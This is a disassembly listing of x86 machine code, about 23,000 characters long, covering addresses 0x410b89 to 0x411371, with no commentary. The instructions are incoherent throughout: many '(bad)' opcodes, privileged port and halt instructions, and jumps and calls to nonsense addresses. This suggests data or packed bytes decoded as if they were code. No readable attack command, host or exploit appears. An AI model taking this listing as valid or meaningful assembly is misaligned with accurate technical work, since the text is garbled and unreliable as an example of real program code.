  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
